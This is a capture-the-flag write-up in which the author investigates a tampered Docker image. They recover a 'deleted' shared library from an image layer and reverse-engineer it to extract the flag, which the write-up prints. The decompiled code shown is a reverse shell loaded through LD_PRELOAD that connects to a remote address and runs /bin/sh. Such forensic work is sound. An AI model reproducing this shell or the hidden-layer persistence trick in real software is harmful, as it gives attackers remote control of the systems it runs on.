# Peel back the layers

The description for this challenge is as follows:

*An unknown maintainer managed to push an update to one of our public docker images. Our SOC team reported suspicious traffic coming from some of our steam factories ever since. The update got retracted making us unable to investigate further. We are concerned that this might refer to a supply-chain attack. Could you investigate?
Docker Image: steammaintainer/gearrepairimage*

The challenge was rated at 1 out of 4 stars, and it was worth 325 points at the end with a total of 165 solves. This one was pretty easy, although it required some basic knowledge of how docker images work and some very basic binary reverse-engineering.

**TL;DR Solution:** Download the docker image and extract it to a tar archive for easy examination of the layers. Note that an attempt to delete a folder was made in the history, and retrieve the file from one of the layers. Note that it displays indicators of malware, and extract the flag loaded into a stack variable.

## Examining the Docker Image

As a first step, I need to retrieve something to investigate. I can actually download the full docker image using a pull command like so:
```
knittingirl@piglet:~/CTF/HTB_Uni_Quals_21$ sudo docker pull steammaintainer/gearrepairimage 
[sudo] password for knittingirl: 
Using default tag: latest
latest: Pulling from steammaintainer/gearrepairimage
7b1a6ab2e44d: Pull complete 
858929a69ddb: Pull complete 
97239c492e4d: Pull complete 
Digest: sha256:10d7e659f8d2bc2abcc4ef52d6d7caf026d0881efcffe016e120a65b26a87e7b
Status: Downloaded newer image for steammaintainer/gearrepairimage:latest
docker.io/steammaintainer/gearrepairimage:latest
```
Afterwards, it shows up in my docker images:
```
knittingirl@piglet:~/CTF/HTB_Uni_Quals_21$ sudo docker images
[sudo] password for knittingirl: 
REPOSITORY                        TAG       IMAGE ID       CREATED        SIZE
steammaintainer/gearrepairimage   latest    47f41629f1cf   10 days ago    72.8MB
```
Based on the image ID, I can look at the command line history of the image. Interestingly, it looks like somebody tried to delete the folder /usr/share/lib/.
```
knittingirl@piglet:~/CTF/HTB_Uni_Quals_21$ sudo docker history 47f41629f1cf
IMAGE          CREATED       CREATED BY                                      SIZE      COMMENT
47f41629f1cf   10 days ago   /bin/sh -c #(nop)  CMD ["bin/bash" "-c" "/bi…   0B        
<missing>      10 days ago   /bin/sh -c rm -rf /usr/share/lib/               0B        
<missing>      10 days ago   /bin/sh -c #(nop)  CMD ["bin/bash" "-c" "/bi…   0B        
<missing>      10 days ago   /bin/sh -c #(nop)  ENV LD_PRELOAD=              0B        
<missing>      10 days ago   /bin/sh -c #(nop)  CMD ["bin/bash" "-c" "/bi…   0B        
<missing>      10 days ago   /bin/sh -c #(nop)  ENV LD_PRELOAD=/usr/share…   0B        
<missing>      10 days ago   /bin/sh -c #(nop) COPY file:0b1afae23b8f468e…   16.4kB    
<missing>      10 days ago   /bin/sh -c #(nop)  CMD ["bin/bash" "-c" "/bi…   0B        
<missing>      5 weeks ago   /bin/sh -c #(nop)  CMD ["bash"]                 0B        
<missing>      5 weeks ago   /bin/sh -c #(nop) ADD file:5d68d27cc15a80653…   72.8MB 
```
The challenge's title references layers. Docker images are actually comprised of several layers, and it is a reasonably common tactic in forensic challenges to hide files in layers that would not be visible if you actually booted up the image and attempted to look at the file system in that manner. One of the more straightforward ways to examine a Docker image's layers is by extracting the whole thing to a tar archive, 
```
sudo docker save 47f41629f1cf > gearrepair.tar
```
I can then untar the archive and examine the contents. I found the supposedly deleted file fairly quickly; here is what the process looks like from the command line.
```
knittingirl@piglet:~/CTF/HTB_Uni_Quals_21$ mkdir peel_back_the_layers
knittingirl@piglet:~/CTF/HTB_Uni_Quals_21$ tar -C peel_back_the_layers -xvf peel_back_the_layers.tar 
0aec9568b70f59cc149be9de4d303bc0caf0ed940cd5266671300b2d01e47922/
0aec9568b70f59cc149be9de4d303bc0caf0ed940cd5266671300b2d01e47922/VERSION
0aec9568b70f59cc149be9de4d303bc0caf0ed940cd5266671300b2d01e47922/json
0aec9568b70f59cc149be9de4d303bc0caf0ed940cd5266671300b2d01e47922/layer.tar
47f41629f1cfcaf8890339a7ffdf6414c0c1417cfa75481831c8710196627d5d.json
49201f69ba5d50da3c2d9fc6b07504640aed8ebf5caee85e2191e715f6d52127/
49201f69ba5d50da3c2d9fc6b07504640aed8ebf5caee85e2191e715f6d52127/VERSION
49201f69ba5d50da3c2d9fc6b07504640aed8ebf5caee85e2191e715f6d52127/json
49201f69ba5d50da3c2d9fc6b07504640aed8ebf5caee85e2191e715f6d52127/layer.tar
52c3108fa9ec86ba321f021d91d0da0c91a2dd2ac173cd27b633f6c2962fac6f/
52c3108fa9ec86ba321f021d91d0da0c91a2dd2ac173cd27b633f6c2962fac6f/VERSION
52c3108fa9ec86ba321f021d91d0da0c91a2dd2ac173cd27b633f6c2962fac6f/json
52c3108fa9ec86ba321f021d91d0da0c91a2dd2ac173cd27b633f6c2962fac6f/layer.tar
manifest.json
knittingirl@piglet:~/CTF/HTB_Uni_Quals_21$ cd peel_back_the_layers/
knittingirl@piglet:~/CTF/HTB_Uni_Quals_21/peel_back_the_layers$ ls
0aec9568b70f59cc149be9de4d303bc0caf0ed940cd5266671300b2d01e47922
47f41629f1cfcaf8890339a7ffdf6414c0c1417cfa75481831c8710196627d5d.json
49201f69ba5d50da3c2d9fc6b07504640aed8ebf5caee85e2191e715f6d52127
52c3108fa9ec86ba321f021d91d0da0c91a2dd2ac173cd27b633f6c2962fac6f
manifest.json
knittingirl@piglet:~/CTF/HTB_Uni_Quals_21/peel_back_the_layers$ cd 0aec9568b70f59cc149be9de4d303bc0caf0ed940cd5266671300b2d01e47922/
knittingirl@piglet:~/CTF/HTB_Uni_Quals_21/peel_back_the_layers/0aec9568b70f59cc149be9de4d303bc0caf0ed940cd5266671300b2d01e47922$ ls
VERSION  json  layer.tar
knittingirl@piglet:~/CTF/HTB_Uni_Quals_21/peel_back_the_layers/0aec9568b70f59cc149be9de4d303bc0caf0ed940cd5266671300b2d01e47922$ tar -xvf layer.tar 
usr/
usr/share/
usr/share/lib/
usr/share/lib/.wh..wh..opq
usr/share/lib/librs.so
knittingirl@piglet:~/CTF/HTB_Uni_Quals_21/peel_back_the_layers/0aec9568b70f59cc149be9de4d303bc0caf0ed940cd5266671300b2d01e47922$ ls
VERSION  json  layer.tar  usr
knittingirl@piglet:~/CTF/HTB_Uni_Quals_21/peel_back_the_layers/0aec9568b70f59cc149be9de4d303bc0caf0ed940cd5266671300b2d01e47922$ cd usr
knittingirl@piglet:~/CTF/HTB_Uni_Quals_21/peel_back_the_layers/0aec9568b70f59cc149be9de4d303bc0caf0ed940cd5266671300b2d01e47922/usr$ ls
share
knittingirl@piglet:~/CTF/HTB_Uni_Quals_21/peel_back_the_layers/0aec9568b70f59cc149be9de4d303bc0caf0ed940cd5266671300b2d01e47922/usr$ cd share
knittingirl@piglet:~/CTF/HTB_Uni_Quals_21/peel_back_the_layers/0aec9568b70f59cc149be9de4d303bc0caf0ed940cd5266671300b2d01e47922/usr/share$ ls
lib
knittingirl@piglet:~/CTF/HTB_Uni_Quals_21/peel_back_the_layers/0aec9568b70f59cc149be9de4d303bc0caf0ed940cd5266671300b2d01e47922/usr/share$ cd lib
knittingirl@piglet:~/CTF/HTB_Uni_Quals_21/peel_back_the_layers/0aec9568b70f59cc149be9de4d303bc0caf0ed940cd5266671300b2d01e47922/usr/share/lib$ ls
librs.so

```

## Reverse Engineering the .so File

If I run strings on this file, there are some indicators of it being a reverse shell of some kind; there are references to REMOTE_ADDR and REMOTE_PORT, and there is a GOT entry for the execve function.
```
knittingirl@piglet:~/CTF/HTB_Uni_Quals_21/peel_back_the_layers/0aec9568b70f59cc149be9de4d303bc0caf0ed940cd5266671300b2d01e47922/usr/share/lib$ strings -n10 librs.so 
__gmon_start__
_ITM_deregisterTMCloneTable
_ITM_registerTMCloneTable
__cxa_finalize
GLIBC_2.2.5
REMOTE_ADDR
REMOTE_PORT
GCC: (Debian 10.2.1-6) 10.2.1 20210110
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
__FRAME_END__
__dso_handle
__GNU_EH_FRAME_HDR
__TMC_END__
_GLOBAL_OFFSET_TABLE_
getenv@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
write@GLIBC_2.2.5
htons@GLIBC_2.2.5
dup2@GLIBC_2.2.5
execve@GLIBC_2.2.5
inet_addr@GLIBC_2.2.5
__gmon_start__
atoi@GLIBC_2.2.5
connect@GLIBC_2.2.5
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
fork@GLIBC_2.2.5
socket@GLIBC_2.2.5
.note.gnu.build-id
.gnu.version
.gnu.version_r
.eh_frame_hdr
.init_array
.fini_array
```
If I decompile the file with Ghidra, I can see that the suspicious activity seems to be taking place in a con() function. It looks like a string is getting loaded into a stack variable, and this is probably the flag.
```
undefined8 con(void)

{
  int iVar1;
  char *__nptr;
  char local_68 [40];
  undefined local_38 [4];
  in_addr_t local_34;
  int local_20;
  uint16_t local_1a;
  char *local_18;
  __pid_t local_c;
  
  local_c = fork();
  if (local_c == 0) {
    local_18 = getenv("REMOTE_ADDR");
    __nptr = getenv("REMOTE_PORT");
    iVar1 = atoi(__nptr);
    local_1a = (uint16_t)iVar1;
    local_68._0_8_ = 0x33725f317b425448;
    local_68._8_8_ = 0x6b316c5f796c6c34;
    local_68._16_8_ = 0x706d343374735f33;
    local_68._24_8_ = 0x306230725f6b6e75;
    local_68._32_8_ = 0xd0a7d2121217374;
    local_38._0_2_ = 2;
    local_34 = inet_addr(local_18);
    local_38._2_2_ = htons(local_1a);
    local_20 = socket(2,1,0);
    connect(local_20,(sockaddr *)local_38,0x10);
    write(local_20,local_68,0x29);
    dup2(local_20,0);
    dup2(local_20,1);
    dup2(local_20,2);
    execve("/bin/sh",(char **)0x0,(char **)0x0);
  }
  return 0;
}
```
I created a python script to do the conversion for me:
```
flag_list = []
flag_list.append(0x33725f317b425448)
flag_list.append(0x6b316c5f796c6c34)
flag_list.append(0x706d343374735f33)
flag_list.append(0x306230725f6b6e75)
flag_list.append(0xd0a7d2121217374)

flag = b''
for item in flag_list:
	flag += (item).to_bytes(8, byteorder='little')
print(flag)
```
And it printed out the flag for me:
```
knittingirl@piglet:~/CTF/HTB_Uni_Quals_21$ python3 gearrepair_string_convert.py 
b'HTB{1_r34lly_l1k3_st34mpunk_r0b0ts!!!}\n\r'
```
Thanks for reading!
